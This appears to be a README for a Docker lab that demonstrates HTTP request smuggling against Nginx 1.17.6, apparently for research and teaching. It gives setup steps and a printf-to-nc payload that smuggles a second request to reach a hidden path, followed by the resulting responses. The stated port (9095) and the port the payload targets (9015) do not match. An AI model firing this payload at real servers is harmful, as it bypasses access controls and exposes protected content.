#	HTTP REQUEST SMUGGLING ON NGINX

##	AFFECTED VERSION

Nginx 1.17.6

##	Usage

DEMONSTARTION PURPOSE.

###	HOW TO CONFIGURE 

```bash
$ git clone https://github.com/403accessdenied/HTTP-REQUEST-SMUGGLING
$ cd HTTP-REQUEST-SMUGGLING
$ docker-compose up -d
```


The nginx server will on the port 9095.



###	check

```bash
$ chmod +x check.sh;./check.sh|grep HTTP
HTTP/1.1 302 Moved Temporarily
```

1 HTTP code 302 means all right! 

Enjoy!



###	

```bash
printf 'GET /a HTTP/1.1\r\n'\
'Host: localhost\r\n'\
'Content-Length: 56\r\n'\
'\r\n'\
'GET /_hidden/index.html HTTP/1.1\r\n'\
'Host: notlocalhost\r\n'\
'\r\n'\
|nc 127.0.0.1 9015
```

Try the command above and you will get two responses as following.

```http
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.17.6
Date: Sat, 04 Jan 2020 04:23:26 GMT
Content-Type: text/html
Content-Length: 145
Connection: keep-alive
Location: http://example.org

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.17.6</center>
</body>
</html>
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Sat, 04 Jan 2020 04:23:26 GMT
Content-Type: text/html
Content-Length: 22
Connection: keep-alive

successfully accessed my secret!
```



#	Reference

https://bertjwregeer.keybase.pub/2019-12-10%20-%20error_page%20request%20smuggling.pdf
